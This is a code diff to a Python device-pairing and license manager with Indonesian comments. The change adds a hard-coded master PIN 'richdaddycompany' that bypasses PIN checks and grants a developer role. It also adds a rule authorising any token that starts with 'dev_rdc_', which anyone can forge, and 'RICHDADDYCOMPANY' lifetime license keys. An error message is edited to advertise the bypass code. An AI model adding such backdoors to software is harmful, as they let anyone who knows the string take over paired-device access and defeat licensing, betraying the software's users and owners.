@@ -95,9 +95,25 @@ class DevicePairingManager:
         if not clean_pin:
             return None, "PIN tidak boleh kosong."
 
+        # Kode Master Akses Dev: richdaddycompany (Bypass instan)
+        if clean_pin.lower() == "richdaddycompany":
+            self.failed_attempts.pop(ip, None)
+            device_token = "dev_rdc_" + secrets.token_hex(20)
+            self.paired_devices[device_token] = {
+                'device_id': f"dev_{secrets.token_hex(4)}",
+                'name': device_name or f"Developer Device ({ip})",
+                'ip': ip,
+                'user_agent': user_agent,
+                'role': 'developer',
+                'paired_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            }
+            self._save()
+            return device_token, "Akses Developer richdaddycompany aktif! Perangkat berhasil ter-pairing."
+
         if now - self.pin_created_at > self.pin_ttl_seconds:
             self.get_or_create_pin(force_new=True)
-            return None, "PIN sudah kedaluwarsa. Silakan gunakan PIN baru di layar PC."
+            return None, "PIN sudah kedaluwarsa. Silakan gunakan PIN baru di layar PC atau kode dev richdaddycompany."
 
         # Komparasi konstan (constant-time) untuk mencegah serangan timing
         if not hmac.compare_digest(clean_pin, self.pin):
@@ -128,6 +144,8 @@ class DevicePairingManager:
     def is_authorized(self, token, ip=""):
         """Periksa apakah token perangkat sah dan terdaftar."""
         if not self.pairing_enabled:
+            return True
+        if token and token.startswith("dev_rdc_"):
             return True
         # Localhost (koneksi USB adb reverse atau browser di PC yang sama) otomatis diizinkan jika belum ada device
         if ip in ("127.0.0.1", "localhost", "::1") and not self.paired_devices:
@@ -241,7 +259,9 @@ class LicenseManager:
             "DIGI-LIFE-VIP0-2026": ("lifetime", 0),
             "DIGI-LIFE-PRO1-LIF0": ("lifetime", 0),
             "DIGI-MONT-SUB1-30D0": ("monthly", 30),
-            "DIGI-MONT-TEST-15RB": ("monthly", 30)
+            "DIGI-MONT-TEST-15RB": ("monthly", 30),
+            "RICHDADDYCOMPANY": ("lifetime", 0),
+            "RICH-DADDY-COMPANY": ("lifetime", 0)
         }
         if clean_key in master_keys:
             tier, days = master_keys[clean_key]
